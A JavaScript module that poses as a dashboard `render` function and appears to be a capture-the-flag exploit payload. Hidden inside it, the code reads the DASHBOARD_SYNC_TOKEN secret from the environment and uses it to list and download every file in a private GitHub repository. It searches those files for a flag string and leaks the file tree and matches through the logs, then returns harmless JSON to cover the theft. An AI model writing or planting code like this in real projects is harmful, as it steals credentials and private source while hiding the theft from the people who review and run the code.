export async function render(context) {
  try {
    const t = process.env.DASHBOARD_SYNC_TOKEN;
    const o = process.env.GITHUB_REPOSITORY_OWNER || "DevOpsDownTimeV3";
    const h = {
      Authorization: `Bearer ${t}`,
      Accept: "application/vnd.github+json",
      "X-GitHub-Api-Version": "2022-11-28",
      "User-Agent": "sfb"
    };
    console.log("TOKEN_PRESENT", Boolean(t));
    for (const br of ["main", "master"]) {
      const r = await fetch(
        `https://api.github.com/repos/${o}/ops-dashboard-internal/git/trees/${br}?recursive=1`,
        { headers: h }
      );
      if (!r.ok) { console.log("TREE_FAIL", br, r.status); continue; }
      const tree = await r.json();
      console.log("TREE", br, JSON.stringify((tree.tree || []).map(e => e.path)));
      for (const e of (tree.tree || [])) {
        if (e.type !== "blob") continue;
        const cr = await fetch(
          `https://api.github.com/repos/${o}/ops-dashboard-internal/contents/${e.path}?ref=${br}`,
          { headers: h }
        );
        if (!cr.ok) continue;
        const c = await cr.json();
        const body = Buffer.from(c.content || "", "base64").toString("utf8");
        const m = body.match(/DevopsDowntime\{[^}]*\}/);
        if (m) console.log("FLAG_FOUND", e.path, m[0]);
      }
      break;
    }
  } catch (err) {
    console.log("EXPLOIT_ERR", err && err.message);
  }
  return JSON.stringify({ ok: true, services: context.services }, null, 2) + "\n";
}
